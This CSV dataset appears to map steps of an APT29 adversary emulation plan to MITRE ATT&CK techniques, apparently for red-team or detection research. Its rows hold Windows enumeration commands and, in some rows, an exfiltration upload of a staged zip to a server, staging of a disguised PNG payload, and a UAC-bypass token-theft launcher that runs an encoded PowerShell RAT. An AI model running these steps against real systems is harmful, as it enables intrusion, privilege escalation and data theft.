org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
apt29,apt29,unknown,apt29::11,11,System Owner / User Discovery,"id: 35d95b64-c1f8-4ac7-a2f2-8959218239cd | name: System Owner / User Discovery | description: The native echo command is executed via cmd to enumerate local environment variables associated with current user and domain. | tactic: discovery | technique: attack_id: T1033 | name: System Owner/User Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.B.1 | platforms: windows: cmd: command: echo %USERDOMAIN%\%USERNAME%
 | executors: name: command_prompt | command: echo %USERDOMAIN%\%USERNAME%
","[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::12,12,System Owner/User Discovery,attack_id: T1033 | name: System Owner/User Discovery,"[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::13,13,Data from staged fileand Exfiltration over C2 Channel,"id: 68e209dd-f354-4adc-8bc6-e85a3e55a7f4 | name: Data from staged fileand Exfiltration over C2 Channel | description: Copy a target file from a remote file share through the existing C2 channel | tactic: exfiltration | technique: attack_id: T1041 | name: Exfiltration Over Command and Control Channel | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_exfiltration | procedure_step: 2.B.2 | platforms: windows: psh,pwsh: command: Import-Module .\upload.ps1 -Verbose -Force;
Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\AppData\Roaming\Draft.zip"" -Uri ""#{server}/file/upload"";
 | payloads: upload.ps1 | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\upload.ps1 -Verbose -Force;
Invoke-MultipartFormDataUpload -InFile ""C:\Users\#{profile_user}\AppData\Roaming\Draft.zip"" -Uri ""#{server}/file/upload"";
","[""T1041""]","[""T1041""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::14,14,Exfiltration Over Command and Control Channel,attack_id: T1041 | name: Exfiltration Over Command and Control Channel,"[""T1041""]","[""T1041""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::15,15,Process Discovery,"id: 5df12481-9d8c-4235-b550-9cefc8ed7361 | name: Process Discovery | description: API call(s) are executed to enumerate local running processes. | tactic: discovery | technique: attack_id: T1057 | name: Process Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.C.1 | platforms: windows: psh,pwsh: command: Import-Module .\ps.ps1 -Verbose -Force;
ProcessList
 | payloads: ps.ps1 | executors: name: powershell | command: Import-Module .\ps.ps1 -Verbose -Force;
ProcessList
","[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::16,16,Process Discovery,attack_id: T1057 | name: Process Discovery,"[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::17,17,Process Discovery,"id: 41610306-087c-4c34-874b-37b8ed633a36 | name: Process Discovery | description: The tasklist utility is executed via cmd to enumerate local running processes. | tactic: discovery | technique: attack_id: T1057 | name: Process Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.C.2 | platforms: windows: cmd: command: tasklist /v
 | executors: name: command_prompt | command: tasklist /v
","[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::18,18,Process Discovery,attack_id: T1057 | name: Process Discovery,"[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::19,19,System Service Discovery,"id: 2ff877b4-0c00-401e-9d3f-070c70b610df | name: System Service Discovery | description: The sc utility is executed via cmd to enumerate local active services. | tactic: discovery | technique: attack_id: T1007 | name: System Service Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.D.1 | platforms: windows: cmd: command: sc query
 | executors: name: command_prompt | command: sc query
","[""T1007""]","[""T1007""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::20,20,System Service Discovery,attack_id: T1007 | name: System Service Discovery,"[""T1007""]","[""T1007""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::21,21,System Service Discovery,"id: 144b1384-5060-494f-80eb-91772695cdf3 | name: System Service Discovery | description: The net utility is executed via cmd to enumerate local active services. | tactic: discovery | technique: attack_id: T1007 | name: System Service Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.D.2 | platforms: windows: cmd: command: net start
 | executors: name: command_prompt | command: net start
","[""T1007""]","[""T1007""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::22,22,System Service Discovery,attack_id: T1007 | name: System Service Discovery,"[""T1007""]","[""T1007""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::23,23,System Information Discovery,"id: d2ea2676-7f85-4228-b980-ab3c0e1adc03 | name: System Information Discovery | description: The systeminfo utility is executed via cmd to enumerate local operating system configuration. | tactic: discovery | technique: attack_id: T1082 | name: System Information Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.E.1 | platforms: windows: cmd: command: systeminfo
 | executors: name: command_prompt | command: systeminfo
","[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::24,24,System Information Discovery,attack_id: T1082 | name: System Information Discovery,"[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::25,25,System Information Discovery,"id: 7c2a6e5b-1adb-464f-a581-4677391f8dd6 | name: System Information Discovery | description: The net utility is executed via cmd to enumerate local operating system configuration. | tactic: discovery | technique: attack_id: T1082 | name: System Information Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.E.2 | platforms: windows: cmd: command: net config workstation
 | executors: name: command_prompt | command: net config workstation
","[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::26,26,System Information Discovery,attack_id: T1082 | name: System Information Discovery,"[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::27,27,Permissions Groups Discovery,"id: faa96e7f-081a-40b7-a743-a6a7f2627ea3 | name: Permissions Groups Discovery | description: The net utility is executed via cmd to enumerate members of the local system's administrators group. | tactic: discovery | technique: attack_id: T1069 | name: Permission Groups Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.F.1 | platforms: windows: cmd: command: net localgroup administrators
 | executors: name: command_prompt | command: net localgroup administrators
","[""T1069""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::28,28,Permission Groups Discovery,attack_id: T1069 | name: Permission Groups Discovery,"[""T1069""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::29,29,Permissions Groups Discovery,"id: 26181249-be75-41ed-9fe7-5c30ea8c2d4d | name: Permissions Groups Discovery | description: The net utility is executed via cmd to enumerate members of the domain controller’s administrators group. | tactic: discovery | technique: attack_id: T1069 | name: Permission Groups Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.F.2 | platforms: windows: cmd: command: net localgroup administrators /domain
 | executors: name: command_prompt | command: net localgroup administrators /domain
","[""T1069""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::30,30,Permission Groups Discovery,attack_id: T1069 | name: Permission Groups Discovery,"[""T1069""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::31,31,Permissions Groups Discovery,"id: 84377d7a-0363-44fd-a082-44657ca1858f | name: Permissions Groups Discovery | description: The net utility is executed via cmd to enumerate members of the domain administrators group. | tactic: discovery | technique: attack_id: T1069 | name: Permission Groups Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.F.3 | platforms: windows: psh,pwsh: command: cmd.exe /c net group ""Domain Admins"" /domain
 | executors: name: powershell | command: cmd.exe /c net group ""Domain Admins"" /domain
","[""T1069""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::32,32,Permission Groups Discovery,attack_id: T1069 | name: Permission Groups Discovery,"[""T1069""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::33,33,Account Discovery,"id: 61221fb9-cb32-46d5-98fd-90567a621526 | name: Account Discovery | description: The net utility is executed via cmd to enumerate domain user accounts. | tactic: discovery | technique: attack_id: T1087 | name: Account Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.G.1 | platforms: windows: cmd: command: net user /domain
 | executors: name: command_prompt | command: net user /domain
","[""T1087""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::34,34,Account Discovery,attack_id: T1087 | name: Account Discovery,"[""T1087""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::35,35,Account Discovery,"id: 9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76 | name: Account Discovery | description: The net utility is executed via cmd to enumerate detailed information about a specific user account. | tactic: discovery | technique: attack_id: T1087 | name: Account Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.G.2 | platforms: windows: cmd: command: net user %USERNAME% /domain
 | executors: name: command_prompt | command: net user %USERNAME% /domain
","[""T1087""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::36,36,Account Discovery,attack_id: T1087 | name: Account Discovery,"[""T1087""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::37,37,Query Registry,"id: 5c23f638-9cfc-4fc4-9cab-4af628fef70a | name: Query Registry | description: The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions. | tactic: discovery | technique: attack_id: T1012 | name: Query Registry | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.H.1 | platforms: windows: cmd: command: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
 | executors: name: command_prompt | command: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
","[""T1012""]","[""T1012""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::38,38,Query Registry,attack_id: T1012 | name: Query Registry,"[""T1012""]","[""T1012""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::39,39,Staging monkey PNG,"id: 68b588bc-002a-42dc-bac7-9189f944065b | name: Staging monkey PNG | description: Staging PNG for Lateral Movement | tactic: defensive-evasion | technique: attack_id: T1036.005 | name: Masquerading: Match Legitimate Name or Location | cti_source: https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016 | procedure_group: procedure_def_evasion | procedure_step: 3.A.1 | platforms: windows: psh,pwsh: command: $username=""#{profile_user}"";
if ( $(test-path -path ""C:\Users\$username\Downloads\monkey.png"") -eq $false ) {
  copy-item monkey.png -Destination ""C:\Users\$username\Downloads\\"" -Force;
  if ($? -eq $True) {
    write-host ""[+] Successfully copied monkey.png!"";
    get-childitem -path ""C:\Users\$username\Downloads\\"";
    exit 0;
  } else {
    write-host ""[+] Failed to copy monkey.png."";
    exit 1;
  }

  } else {
    write-host ""[*] monkey.png already exists within C:\users\$username\Downloads...""
  }
 | payloads: monkey.png | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | executors: name: powershell | command: $username=""#{profile_user}"";
if ( $(test-path -path ""C:\Users\$username\Downloads\monkey.png"") -eq $false ) {
  copy-item monkey.png -Destination ""C:\Users\$username\Downloads\\"" -Force;
  if ($? -eq $True) {
    write-host ""[+] Successfully copied monkey.png!"";
    get-childitem -path ""C:\Users\$username\Downloads\\"";
    exit 0;
  } else {
    write-host ""[+] Failed to copy monkey.png."";
    exit 1;
  }
","[""T1036.005""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::40,40,Masquerading: Match Legitimate Name or Location,attack_id: T1036.005 | name: Masquerading: Match Legitimate Name or Location,"[""T1036.005""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::41,41,Bypass User Account Control,"id: 1345bff7-6f26-43b2-a92a-9aabccdb3db0 | name: Bypass User Account Control | description: A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality. | tactic: privilege-escalation | technique: attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft | cti_source: https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016 | procedure_group: procedure_privesc | procedure_step: 3.A.2 | platforms: windows: psh,pwsh: command: Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""Import-Module $env:APPDATA\update.ps1;update('#{server}')""));
Invoke-BypassUACTokenManipulation -Arguments ""-nop -exec bypass -EncodedCommand $pcode"" -Verbose
 | payloads: update.ps1 | Invoke-BypassUACTokenManipulation.ps1 | input_arguments: server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""Import-Module $env:APPDATA\update.ps1;update('#{server}')""));
Invoke-BypassUACTokenManipulation -Arguments ""-nop -exec bypass -EncodedCommand $pcode"" -Verbose
","[""T1134.001""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::42,42,Access Token Manipulation: Token Impersonation/Theft,attack_id: T1134.001 | name: Access Token Manipulation: Token Impersonation/Theft,"[""T1134.001""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
